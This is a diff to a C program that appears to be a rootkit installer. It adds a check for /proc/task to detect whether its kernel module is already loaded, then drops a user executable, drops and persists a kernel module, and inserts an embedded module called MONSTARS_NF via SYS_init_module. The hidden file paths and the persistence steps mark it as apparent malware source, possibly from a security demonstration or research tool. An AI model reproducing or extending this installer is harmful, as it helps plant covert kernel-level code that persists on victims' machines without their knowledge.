@@ -16,6 +16,24 @@ static const char c_user_exe_path[255] = "BASKETBALLJONES";
 static const char c_kernel_mod_path[255] = "MORONMOUNTAIN";
 
 //
+// check for /proc/task (ko already inserted)
+//
+int check_proc_task()
+{
+    int retval = 0;
+
+    FILE *task = fopen("/proc/task", "r");
+    if (NULL != task)
+    {
+        fclose(task);
+        DEBUG_LOG("/proc/task already exists!\n");
+        retval = -1;
+    }
+
+    return retval;
+}
+
+//
 // drop the user exe to disk
 //
 int drop_user_exe()
@@ -169,20 +187,23 @@ int main()
 {
     int retval = -1;
 
-    if (0 == drop_user_exe())
+    if (0 == check_proc_task())
     {
-        if (0 == drop_kernel_mod())
+        if (0 == drop_user_exe())
         {
-            if (0 == persist_kernel_mod())
+            if (0 == drop_kernel_mod())
             {
-                if (0 == syscall(SYS_init_module, (void *)c_KernelMod, sizeof(c_KernelMod), ""))
+                if (0 == persist_kernel_mod())
                 {
-                    DEBUG_LOG("MONSTARS_NF installed!\n");
-                    retval = 0;
-                }
-                else
-                {
-                    DEBUG_LOG("Failed to insert MONSTARS_NF module (errno: %d)\n", errno);
+                    if (0 == syscall(SYS_init_module, (void *)c_KernelMod, sizeof(c_KernelMod), ""))
+                    {
+                        DEBUG_LOG("MONSTARS_NF installed!\n");
+                        retval = 0;
+                    }
+                    else
+                    {
+                        DEBUG_LOG("Failed to insert MONSTARS_NF module (errno: %d)\n", errno);
+                    }
                 }
             }
         }
